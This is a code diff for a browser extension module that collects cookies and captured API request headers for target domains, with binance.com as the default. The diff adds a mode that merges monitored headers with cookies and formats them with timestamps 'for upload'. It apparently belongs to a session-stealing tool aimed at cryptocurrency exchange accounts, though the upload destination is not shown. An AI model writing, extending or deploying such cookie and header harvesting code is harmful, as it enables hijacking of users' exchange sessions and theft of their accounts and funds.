@@ -12,7 +12,10 @@ import { getConfig } from './config.js';
 export async function getAllCookies() {
   try {
     const config = await getConfig();
-    const domains = config.targetDomains || ['binance.com'];
+    const targetDomains = config.targetDomains || [{ domain: 'binance.com', apiPaths: [] }];
+
+    // Extract domain list (handle both old and new format)
+    const domains = targetDomains.map(d => typeof d === 'string' ? d : d.domain).filter(Boolean);
     const allCookies = [];
 
     for (const domain of domains) {
@@ -67,17 +70,57 @@ export async function getFormattedCookies() {
 }
 
 /**
+ * Format cookies/headers data for upload (new format)
+ * @param {Object} cookies - Cookies object { name: value }
+ * @param {Object} headers - Headers object { name: value }
+ * @returns {Object} Formatted data
+ */
+export function formatCookiesHeadersForUpload(cookies, headers) {
+  return {
+    timestamp: Date.now(),
+    cookies: cookies || {},
+    headers: headers || {}
+  };
+}
+
+/**
  * Get formatted cookies per domain
+ * Supports both old mode (all cookies) and new mode (API path monitoring)
  * @returns {Promise<Array>} Array of {domain, cookieData} objects
  */
 export async function getFormattedCookiesByDomain() {
   try {
     const config = await getConfig();
-    const domains = config.targetDomains || ['binance.com'];
+    const targetDomains = config.targetDomains || [{ domain: 'binance.com', apiPaths: [] }];
     const results = [];
 
-    for (const domain of domains) {
+    // Check if we should use API monitor data
+    const { getAllStoredApiData } = await import('./api-monitor.js');
+    const apiData = await getAllStoredApiData();
+    const apiDataMap = new Map(apiData.map(item => [item.domain, item.data]));
+
+    for (const domainConfig of targetDomains) {
+      const domain = typeof domainConfig === 'string' ? domainConfig : domainConfig.domain;
+      const apiPaths = typeof domainConfig === 'string' ? [] : (domainConfig.apiPaths || []);
+
       try {
+        // If API paths are configured, use API monitor data
+        if (apiPaths && apiPaths.length > 0) {
+          const storedApiData = apiDataMap.get(domain);
+          if (storedApiData && storedApiData.cookies && storedApiData.headers) {
+            const cookieData = formatCookiesHeadersForUpload(
+              storedApiData.cookies,
+              storedApiData.headers
+            );
+            results.push({
+              domain,
+              cookieData
+            });
+            continue;
+          }
+        }
+
+        // Fall back to cookie-only mode (backward compatible)
         const cookies = await chrome.cookies.getAll({ domain });
         if (cookies.length > 0) {
           const cookieData = formatCookiesForUpload(cookies);
